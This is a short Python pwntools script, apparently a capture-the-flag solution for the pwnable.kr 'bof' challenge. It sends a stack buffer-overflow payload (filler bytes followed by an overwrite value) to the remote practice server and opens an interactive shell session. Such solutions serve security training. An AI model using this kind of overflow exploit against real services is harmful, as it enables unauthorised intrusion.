from pwn import process, remote, p64
#r = process('./bof')
r = remote('pwnable.kr', 9000)
babe = 0xcafebabecafebabe
payload = b'\xA1'*52+p64(babe)
open('payload', 'wb').write(payload)
r.sendline(payload)
r.interactive()
